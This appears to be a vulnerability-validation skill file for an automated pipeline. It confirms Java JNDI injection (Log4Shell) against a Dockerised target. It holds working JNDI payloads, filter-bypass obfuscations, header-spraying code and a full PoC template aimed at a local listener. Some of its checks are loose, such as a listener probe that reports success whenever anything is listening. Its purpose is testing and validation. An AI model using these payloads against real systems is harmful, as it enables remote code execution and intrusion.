---
name: validate-jndi-injection
description: >
  Validate Java JNDI injection vulnerabilities (Log4Shell pattern) by injecting
  JNDI lookup payloads and detecting outbound LDAP/RMI connections or code
  execution evidence. Java-specific; only applicable to Java targets.
origin: vuln-analysis
language: java
---

# Validator: JNDI Injection (Java)

Confirm whether a Java application passes user-controlled input to a JNDI lookup,
enabling remote class loading and arbitrary code execution.

## When to Activate

- A `jndi_injection` vulnerability needs validation (Step 7/8)
- **Target language MUST be Java** — JNDI is a Java-only API
- Only activate when `target.json.language == "java"`

## What is JNDI Injection?

JNDI (Java Naming and Directory Interface) injection occurs when user-controlled
input flows into:
1. **Log4j/Log4j2 logging calls** — the logger evaluates `${jndi:ldap://...}` in
   message strings (CVE-2021-44228 "Log4Shell", CVSS 10.0)
2. **Direct `InitialContext.lookup(user_input)` calls** — attacker supplies an
   LDAP/RMI/DNS URL that the JVM resolves, loading a remote class
3. **Spring JndiTemplate.lookup(user_input)** — same as above

**Attack result**: Remote class loading from attacker-controlled LDAP/RMI server →
arbitrary code execution in the JVM context.

## Infrastructure Requirements

Two-tier approach — both run inside Docker:

### Primary: TCP Listener on Port 59877 (LDAP/RMI callback)
```bash
# Inside Docker container — receives outbound connection from vulnerable app
nc -lvnp 59877 &
LDAP_LISTENER_PID=$!
```

### Alternative: DNS Callback (when no network listener available)
Use a unique subdomain that the PoC checks for DNS resolution evidence:
```
${jndi:ldap://jndi-poc-<unique_id>.vuln-test.internal/exploit}
```

## Validation Technique

### Step 1: Construct JNDI Payloads

```python
import secrets
JNDI_ID = secrets.token_hex(6)

PAYLOADS = [
    # Log4Shell style — works if target uses Log4j 2.x without patches
    f'${{jndi:ldap://127.0.0.1:59877/{JNDI_ID}}}',
    f'${{jndi:rmi://127.0.0.1:59877/{JNDI_ID}}}',
    f'${{jndi:dns://127.0.0.1:59877/{JNDI_ID}}}',

    # Obfuscated variants (bypass naive filters)
    f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://127.0.0.1:59877/{JNDI_ID}}}',
    f'${{j${{::-n}}di:ldap://127.0.0.1:59877/{JNDI_ID}}}',

    # Direct InitialContext.lookup bypass (when reflected in error messages)
    f'ldap://127.0.0.1:59877/{JNDI_ID}',
]
```

### Step 2: Inject via All Entry Points

Target EVERY parameter that may be logged or passed to a lookup:
- HTTP headers: `User-Agent`, `X-Forwarded-For`, `X-Api-Version`, `Authorization`
- Request body fields (JSON/form)
- URL path parameters
- Query string parameters

```python
def inject_jndi(target, payload, timeout):
    headers = {
        "User-Agent": payload,
        "X-Forwarded-For": payload,
        "X-Api-Version": payload,
        "X-Forwarded-Host": payload,
        "Referer": payload,
        "Accept-Language": payload,
    }
    # Also try in body
    body_payloads = {
        "username": payload,
        "message": payload,
        "input": payload,
        "q": payload,
    }
    responses = []
    try:
        responses.append(requests.get(f"{target}/", headers=headers, timeout=timeout))
        responses.append(requests.post(f"{target}/api/login", json=body_payloads, timeout=timeout))
    except Exception:
        pass
    return responses
```

### Step 3: Check for Connection / Code Execution

**Primary evidence (listener callback)**:
```bash
# Check if the listener received a connection
docker exec <container> sh -c "netstat -an | grep 59877 | grep ESTABLISHED"
```

**Secondary evidence (code execution marker)**:
```python
# PoC also writes a marker file if it achieves RCE
MARKER_FILE = f"/tmp/jndi_confirmed_{JNDI_ID}"
```

**Evidence hierarchy**:
1. TCP connection to port 59877 (CONFIRMED — JNDI lookup initiated)
2. Marker file `/tmp/jndi_confirmed_*` exists (CONFIRMED — full RCE via class loading)
3. `JNDI_CONFIRMED` in PoC output
4. Java `com.sun.jndi.ldap.object.trustURLCodebase` error → partial (confirms lookup attempted)
5. `javax.naming.CommunicationException` with attacker host → PARTIAL

## Legitimacy Check (Anti-Cheat)

Scan PoC script. If these patterns appear as direct calls (not payload strings), result is `[INVALID]`:

```python
# FORBIDDEN — calling JNDI via direct Java subprocess
subprocess.run(["java", "-cp", "...", "ExploitClass"])  # INVALID if not target app

# CORRECT — injecting payload into target app's HTTP endpoint
requests.post(f"{target}/api/submit", json={"data": payload})  # VALID
```

## PoC Template

```python
#!/usr/bin/env python3
"""PoC for <VULN_ID>: jndi_injection — JNDI Lookup via <injection_point>"""
import argparse, sys, time, os, secrets, socket
import requests

JNDI_ID = secrets.token_hex(6)
MARKER_FILE = f"/tmp/jndi_confirmed_{JNDI_ID}"
LISTENER_PORT = 59877

PAYLOADS = [
    f'${{jndi:ldap://127.0.0.1:{LISTENER_PORT}/{JNDI_ID}}}',
    f'${{jndi:rmi://127.0.0.1:{LISTENER_PORT}/{JNDI_ID}}}',
    # Bypass variants
    f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://127.0.0.1:{LISTENER_PORT}/{JNDI_ID}}}',
]

def check_listener_connection(timeout_s=3):
    """Try to detect if outbound LDAP connection was made to our listener."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout_s)
            # If connection already established, netstat would show it
            # This is a proxy check — actual listener runs via nc in Docker
            s.connect(('127.0.0.1', LISTENER_PORT))
            return True  # Something is listening (our nc -lvnp)
    except Exception:
        return False

def exploit(target, timeout):
    headers_to_inject = {
        "User-Agent": None,
        "X-Forwarded-For": None,
        "X-Api-Version": None,
        "X-Forwarded-Host": None,
    }
    for payload in PAYLOADS:
        try:
            for header_name in headers_to_inject:
                headers = {header_name: payload}
                requests.get(f"{target}/", headers=headers, timeout=timeout)

            # Also inject in body
            requests.post(f"{target}/api/login",
                         json={"username": payload, "password": "test"},
                         timeout=timeout)

            time.sleep(1)  # Wait for async JNDI resolution

            # Check for marker file (set by remote class if RCE achieved)
            if os.path.exists(MARKER_FILE):
                return {"method": "rce_via_class_loading", "marker": MARKER_FILE}

        except Exception:
            continue

    return None

def validate(result):
    return result is not None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    # Start background listener check
    print(f"[*] JNDI probe ID: {JNDI_ID}")
    print(f"[*] Listener port: {LISTENER_PORT}")

    start = time.time()
    try:
        result = exploit(args.target, args.timeout)
        elapsed = time.time() - start
        if validate(result):
            print(f"[CONFIRMED] VULN_ID jndi_injection — {result['method']} in {elapsed:.2f}s")
            sys.exit(0)
        else:
            print(f"[NOT_REPRODUCED] VULN_ID jndi_injection — no callback in {elapsed:.2f}s")
            sys.exit(1)
    except Exception as e:
        print(f"[ERROR] VULN_ID — {e}")
        sys.exit(2)

if __name__ == "__main__":
    main()
```

## Static Analysis Patterns

Patterns that indicate JNDI injection risk in Java code:

| Pattern | Risk | Notes |
|---------|------|-------|
| `logger.info(userInput)` / `log.debug(userInput)` with Log4j 2.x | CRITICAL | Log4Shell — any log call with unvalidated user input |
| `new InitialContext().lookup(userInput)` | CRITICAL | Direct JNDI lookup with user-controlled URI |
| `jndiTemplate.lookup(userInput)` | CRITICAL | Spring JndiTemplate |
| `context.lookup(name)` where `name` from HTTP request | HIGH | javax.naming.Context.lookup |
| Log4j version `2.0-beta9` through `2.14.1` in pom.xml/build.gradle | HIGH | Known vulnerable versions |
| `PatternLayout` with `%m` or `${...}` in log4j2.xml | HIGH | Message lookup enabled |

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[SUCCESS]** | JNDI_CONFIRMED marker OR TCP connection to port 59877 received OR marker file created |
| **[PARTIAL]** | Java `CommunicationException` referencing attacker host — lookup attempted but blocked |
| **[FAILED]** | No callback, no error, no marker |
| **[INVALID]** | PoC bypasses target app (calls JNDI API directly rather than through target endpoint) |

## CVSS Reference

| Scenario | Vector | Score |
|----------|--------|-------|
| Log4Shell unauthenticated (network) | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | 10.0 (CRITICAL) |
| Authenticated JNDI injection | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` | 9.9 (CRITICAL) |
| Local JNDI injection (no HTTP path) | `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` | 8.8 (HIGH) |

## Output: Write to results.json

```json
{
  "vuln_id": "VULN-001",
  "type": "jndi_injection",
  "poc_script": "poc_scripts/poc_jndi_injection_001.py",
  "status": "SUCCESS",
  "exit_code": 0,
  "retries": 0,
  "entry_point_used": "POST /api/login (User-Agent header)",
  "validation_result": {
    "marker": "CONFIRMED",
    "evidence": "JNDI lookup initiated: TCP connection received on port 59877 with probe ID jndi_a1b2c3 after injecting ${jndi:ldap://127.0.0.1:59877/jndi_a1b2c3} in User-Agent header"
  }
}
```
